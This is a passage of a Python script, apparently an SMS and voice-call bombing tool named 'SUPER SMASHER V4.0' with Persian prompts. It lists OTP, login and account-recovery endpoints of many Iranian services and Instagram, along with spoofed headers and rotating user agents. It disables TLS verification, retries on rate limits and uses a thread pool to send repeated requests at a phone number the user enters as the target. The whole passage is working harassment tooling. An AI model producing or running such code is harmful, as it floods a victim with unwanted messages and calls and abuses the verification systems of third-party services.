            'method': 'POST',
            'data': f'cellNumber={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://bama.ir',
                'Referer': 'https://bama.ir/Signin',
            }
        },
        
        {
            'name': 'Digify',
            'url': 'https://apollo.digify.shop/graphql',
            'method': 'POST',
            'data': json.dumps({
                "operationName": "Mutation",
                "variables": {"content": {"phone_number": phone}},
                "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) } }"
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://register.digify.shop',
                'Referer': 'https://register.digify.shop/',
            }
        },
        
        {
            'name': 'Snappfood',
            'url': 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass',
            'method': 'POST',
            'data': f'cellphone={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://snappfood.ir',
                'Referer': 'https://snappfood.ir/',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Snapp Market',
            'url': 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass',
            'method': 'POST',
            'data': f'cellphone={phone}',
            'type': 'form',
            'headers': {
                'Referer': 'https://snapp.market/',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Mrbilit',
            'url': 'https://auth.mrbilit.com/api/login/exists/v2',
            'method': 'GET',
            'data': {
                'mobileOrEmail': phone,
                'source': '2',
                'sendTokenIfNot': 'true'
            },
            'type': 'form',
            'headers': {
                'Origin': 'https://mrbilit.com',
                'Referer': 'https://mrbilit.com/',
            }
        },
        
        {
            'name': 'Arka',
            'url': 'https://api.chartex.net/api/v2/user/validate',
            'method': 'POST',
            'data': json.dumps({
                "mobile": phone,
                "country_code": "IR",
                "provider_code": "RUBIKA"
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://arkasafar.ir',
                'Referer': 'https://arkasafar.ir/',
            }
        },
        
        {
            'name': 'Snapptrip',
            'url': 'https://www.snapptrip.com/register',
            'method': 'POST',
            'data': json.dumps({
                "lang": "fa",
                "country_id": "860",
                "password": "snaptrippass",
                "mobile_phone": phone,
                "country_code": "+98",
                "email": "example@gmail.com"
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.snapptrip.com',
                'Referer': 'https://www.snapptrip.com/',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Filmnet',
            'url': f'https://api-v2.filmnet.ir/access-token/users/{phone}/otp',
            'method': 'GET',
            'data': {},
            'type': 'form',
            'headers': {
                'Origin': 'https://filmnet.ir',
                'Referer': 'https://filmnet.ir/',
                'X-Platform': 'Web',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Bitbarg',
            'url': 'https://api.bitbarg.com/api/v1/authentication/registerOrLogin',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://bitbarg.com',
                'Referer': 'https://bitbarg.com/',
            }
        },
        
        {
            'name': 'Drdr',
            'url': 'https://drdr.ir/api/registerEnrollment/sendDisposableCode',
            'method': 'POST',
            'data': json.dumps({"phoneNumber": phone_with_code, "userType": "PATIENT"}),
            'type': 'json',
            'headers': {
                'Origin': 'https://drdr.ir',
                'Referer': 'https://drdr.ir/',
                'Authorization': 'hiToken',
            }
        },
        
        {
            'name': 'Torob SMS',
            'url': 'https://api.torob.com/v4/user/phone/send-pin/',
            'method': 'GET',
            'data': {
                'phone_number': phone,
                'source': 'next_desktop',
                '_landing_page': 'home'
            },
            'type': 'form',
            'headers': {
                'Origin': 'https://torob.com',
                'Referer': 'https://torob.com/',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Torob Voice',
            'url': 'https://api.torob.com/v4/user/phone/send-voice-otp/',
            'method': 'GET',
            'data': {
                'phone_number': phone,
                'source': 'next_desktop',
                '_landing_page': 'home'
            },
            'type': 'form',
            'headers': {
                'Origin': 'https://torob.com',
                'Referer': 'https://torob.com/',
            }
        },
        
        {
            'name': 'Snapp Doctor',
            'url': f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone_without_zero}/sms?cCode=+98',
            'method': 'GET',
            'data': {},
            'type': 'form',
            'headers': {
                'Origin': 'https://snapp.doctor',
                'Referer': 'https://snapp.doctor/',
            }
        },
        
        {
            'name': 'Balad',
            'url': 'https://account.api.balad.ir/api/web/auth/login/',
            'method': 'POST',
            'data': json.dumps({"phone_number": phone, "os_type": "W"}),
            'type': 'json',
            'headers': {
                'Origin': 'https://balad.ir',
                'Referer': 'https://balad.ir/',
                'Device-Id': f'device-{random.randint(1000, 9999)}',
            },
            'delay': 1.0
        },
        
        {
            'name': 'MCI Shop',
            'url': 'https://api-ebcom.mci.ir/services/auth/v1.0/otp',
            'method': 'POST',
            'data': json.dumps({"msisdn": phone_without_zero}),
            'type': 'json',
            'headers': {
                'Origin': 'https://shop.mci.ir',
                'Referer': 'https://shop.mci.ir/',
                'clientid': '1006ee1c-790c-45fa-a86d-ac36846b87e8',
            }
        },
        
        {
            'name': 'Okala',
            'url': 'https://api-react.okala.com/C/CustomerAccount/OTPRegister',
            'method': 'POST',
            'data': json.dumps({
                "mobile": phone,
                "deviceTypeCode": 0,
                "confirmTerms": True,
                "notRobot": False
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.okala.com',
                'Referer': 'https://www.okala.com/',
            }
        },
        
        {
            'name': 'Instagram',
            'url': 'https://www.instagram.com/accounts/account_recovery_send_ajax/',
            'method': 'POST',
            'data': f'email_or_username={phone_with_code}',
            'type': 'form',
            'headers': {
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/password/reset/',
                'X-CSRFToken': f'token-{random.randint(10000, 99999)}',
                'X-IG-App-ID': '936619743392459',
            }
        },
        
        {
            'name': 'Mrbilit New',
            'url': 'https://auth.mrbilit.ir/api/Token/send',
            'method': 'GET',
            'data': {'mobile': phone},
            'type': 'form',
            'headers': {
                'Origin': 'https://mrbilit.ir',
                'Referer': 'https://mrbilit.ir/',
            }
        },
        
        {
            'name': 'Alibaba Fixed',
            'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp',
            'method': 'POST',
            'data': json.dumps({"phoneNumber": phone_without_zero}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.alibaba.ir',
                'Referer': 'https://www.alibaba.ir/',
                'ab-channel': 'WEB',
                'ab-alohomora': 'MTMxOTIzNTI1MjU2NS4yNTEy',
            }
        },
        
        {
            'name': 'Okala Check Password',
            'url': 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/CheckHasPassword',
            'method': 'POST',
            'data': f'mobile={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://www.okala.com',
                'Referer': 'https://www.okala.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
        },
        
        {
            'name': 'Jabama Fixed',
            'url': 'https://gw.jabama.com/api/v4/account/send-code',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://jabama.com',
                'Referer': 'https://jabama.com/',
                'Accept': 'application/json',
            }
        },
        
        {
            'name': 'ZarShop Fixed',
            'url': 'https://zar-shop.com/api/v1/sessions/login_request',
            'method': 'POST',
            'data': json.dumps({"mobile_phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://zar-shop.com',
                'Referer': 'https://zar-shop.com/',
            }
        },
        
        {
            'name': 'Parsimezon Fixed',
            'url': 'https://parsimezon.ir/wp-admin/admin-ajax.php',
            'method': 'POST',
            'data': f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=93fe116779&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0',
            'type': 'form',
            'headers': {
                'Origin': 'https://parsimezon.ir',
                'Referer': 'https://parsimezon.ir/',
                'X-Requested-With': 'XMLHttpRequest',
            }
        },
        
        {
            'name': 'Trip Register',
            'url': 'https://gateway.trip.ir/api/registers',
            'method': 'POST',
            'data': json.dumps({"CellPhone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.trip.ir',
                'Referer': 'https://www.trip.ir/',
            }
        },
        
        {
            'name': 'Trip OTP',
            'url': 'https://gateway.trip.ir/api/Totp',
            'method': 'POST',
            'data': json.dumps({"PhoneNumber": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.trip.ir',
                'Referer': 'https://www.trip.ir/',
            }
        },
        
        {
            'name': 'Paklean Voice',
            'url': 'https://client.api.paklean.com/user/resendVoiceCode',
            'method': 'POST',
            'data': json.dumps({"username": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://paklean.com',
                'Referer': 'https://paklean.com/',
            }
        },
        
        {
            'name': 'Azki Call',
            'url': 'https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code',
            'method': 'GET',
            'data': {'phoneNumber': phone},
            'type': 'form',
            'headers': {
                'Origin': 'https://www.azki.com',
                'Referer': 'https://www.azki.com/',
                'device': 'web',
            }
        },
        
        {
            'name': 'Ragham',
            'url': 'https://web.raghamapp.com/api/users/code',
            'method': 'POST',
            'data': json.dumps({"phone": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://web.raghamapp.com',
                'Referer': 'https://web.raghamapp.com/',
            }
        },
        
        {
            'name': 'Novinbook Call',
            'url': 'https://novinbook.com/index.php?route=account/phone',
            'method': 'POST',
            'data': f'phone={phone}&call=yes',
            'type': 'form',
            'headers': {
                'Origin': 'https://novinbook.com',
                'Referer': 'https://novinbook.com/index.php?route=account/phone',
            }
        },
        
        {
            'name': 'Gharar',
            'url': 'https://gharar.ir/users/phone_number/',
            'method': 'POST',
            'data': f'phone={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://gharar.ir',
                'Referer': 'https://gharar.ir/',
            }
        },
        
        {
            'name': 'Watchonline',
            'url': 'https://api.watchonline.shop/api/v1/otp/request',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.watchonline.shop',
                'Referer': 'https://www.watchonline.shop/',
            }
        },
        
        {
            'name': 'Sabziman',
            'url': 'https://sabziman.com/wp-admin/admin-ajax.php',
            'method': 'POST',
            'data': f'action=newphoneexist&phonenumber={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://sabziman.com',
                'Referer': 'https://sabziman.com/',
            }
        },
        
        {
            'name': 'Offch',
            'url': 'https://api.offch.com/auth/otp',
            'method': 'POST',
            'data': json.dumps({"username": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://offch.com',
                'Referer': 'https://offch.com/',
            }
        },
        
        {
            'name': 'Sibbazar',
            'url': 'https://sandbox.sibbazar.com/api/v1/user/invite',
            'method': 'POST',
            'data': json.dumps({"username": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://sibbazar.com',
                'Referer': 'https://sibbazar.com/',
            }
        },
        
        {
            'name': 'Bit24',
            'url': 'https://bit24.cash/app/api/auth/check-mobile',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://bit24.cash',
                'Referer': 'https://bit24.cash/app/login',
            }
        },
        
        {
            'name': 'Alopeyk',
            'url': 'https://api.alopeyk.com/api/v2/login?platform=pwa',
            'method': 'POST',
            'data': json.dumps({
                "type": "CUSTOMER",
                "model": "Chrome",
                "platform": "pwa",
                "version": "10",
                "manufacturer": "Windows",
                "isVirtual": False,
                "serial": True,
                "app_version": "1.2.6",
                "uuid": True,
                "phone": phone
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://alopeyk.com',
                'Referer': 'https://alopeyk.com/',
            }
        },
        
        {
            'name': 'Snapp Drivers',
            'url': 'https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp',
            'method': 'POST',
            'data': json.dumps({"cellphone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://snapp.ir',
                'Referer': 'https://snapp.ir/',
            }
        },
        
        {
            'name': 'Wide',
            'url': 'https://agent.wide-app.ir/auth/token',
            'method': 'POST',
            'data': json.dumps({
                "grant_type": "otp",
                "client_id": "62b30c4af53e3b0cf100a4a0",
                "phone": phone
            }),
            'type': 'json',
            'headers': {
                'Host': 'agent.wide-app.ir',
                'User-Agent': 'Dart/2.18 (dart:io)',
            }
        }
    ]
    
    return apis

def send_request(api, phone, request_id):
    delay = api.get('delay', BASE_DELAY)
    time.sleep(delay + random.uniform(0, 0.2))
    
    for attempt in range(MAX_RETRIES):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'fa-IR,fa;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
            }
            
            if 'headers' in api:
                headers.update(api['headers'])
            
            if api['type'] == 'json':
                headers['Content-Type'] = 'application/json'
                if isinstance(api['data'], str):
                    data = json.loads(api['data'])
                else:
                    data = api['data']
            else:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                data = api['data']
            
            session = requests.Session()
            
            if api['method'] == 'POST':
                if api['type'] == 'json':
                    response = session.post(
                        api['url'], 
                        json=data, 
                        headers=headers, 
                        timeout=TIMEOUT,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    response = session.post(
                        api['url'], 
                        data=data, 
                        headers=headers, 
                        timeout=TIMEOUT,
                        verify=False,
                        allow_redirects=True
                    )
            else:
                response = session.get(
                    api['url'], 
                    params=data if isinstance(data, dict) else {},
                    headers=headers, 
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
            
            session.close()
            
            status = response.status_code
            
            if status == 200:
                print(f"\r✅ [{request_id}] {api['name']} - 200", flush=True)
                error_manager.add_success()
                return True
                
            elif status == 429:
                print(f"\r⏳ [{request_id}] {api['name']} - 429", flush=True)
                error_manager.add_error(api['name'], 429)
                time.sleep(2)
                continue
                
            elif status in [400, 401, 403, 404, 406, 419, 422]:
                print(f"\r⚠️ [{request_id}] {api['name']} - {status}", flush=True)
                error_manager.add_error(api['name'], status)
                return False
                
            else:
                print(f"\r❌ [{request_id}] {api['name']} - {status}", flush=True)
                error_manager.add_error(api['name'], status)
                return False
                
        except requests.exceptions.Timeout:
            print(f"\r⏱️ [{request_id}] {api['name']} - Timeout", flush=True)
            error_manager.add_error(api['name'], 408, "Timeout")
            time.sleep(1)
            
        except requests.exceptions.ConnectionError:
            print(f"\r🔌 [{request_id}] {api['name']} - Connection Error", flush=True)
            error_manager.add_error(api['name'], 503, "Connection Error")
            time.sleep(1)
            
        except Exception as e:
            print(f"\r💥 [{request_id}] {api['name']} - {str(e)[:30]}", flush=True)
            error_manager.add_error(api['name'], 999, str(e)[:50])
            return False
    
    error_manager.add_fail()
    return False

def worker(api, phone, worker_id):
    success = 0
    fail = 0
    
    for i in range(REQUESTS_PER_API):
        if send_request(api, phone, f"W{worker_id}-{i+1}"):
            success += 1
        else:
            fail += 1
        
        time.sleep(BASE_DELAY)
    
    return success, fail

def main():
    print("=" * 70)
    print("🔥 SUPER SMASHER V4.0 - نسخه نهایی با 85+ API و 100+ User-Agent 🔥")
    print("=" * 70)
    
    phone = input("📱 شماره موبایل مقصد (مثال: 09....): ").strip()
    
    if not phone.startswith('09') or len(phone) != 11:
        print("❌ شماره نامعتبر! باید با 09 شروع شود و 11 رقم باشد.")
        return
    
    all_apis = get_all_apis(phone)
    
    print(f"\n🎯 شماره هدف: {phone}")
    print(f"🚀 تعداد کل APIها: {len(all_apis)}")
    print(f"⚡ تعداد نخ‌های همزمان: {THREAD_COUNT}")
    print(f"📊 تعداد درخواست به هر API: {REQUESTS_PER_API}")
    print(f"📈 مجموع درخواست‌ها: {len(all_apis) * REQUESTS_PER_API}")
    print(f"🔄 تعداد User-Agent: {len(USER_AGENTS)}")
    print("=" * 70)
    
    input("✅ Enter بزن تا شروع بشه...")
    print("\n" + "=" * 70)
    print("⏳ در حال ارسال درخواست‌ها...")
    print("=" * 70)
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        
        for i, api in enumerate(all_apis):
            future = executor.submit(worker, api, phone, i+1)
            futures.append(future)
        
        for future in futures:
            try:
                future.result(timeout=60)
            except Exception as e:
                print(f"❌ خطا در دریافت نتیجه: {e}")
    
    elapsed_time = time.time() - start_time
    
    error_manager.print_report()
    
    print(f"\n⏱️ زمان کل اجرا: {elapsed_time:.1f} ثانیه")
    print(f"📈 سرعت: {error_manager.success_count/elapsed_time:.1f} درخواست موفق بر ثانیه")
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ برنامه متوقف شد توسط کاربر")
    except Exception as e:
        print(f"\n❌ خطای غیرمنتظره: {e}")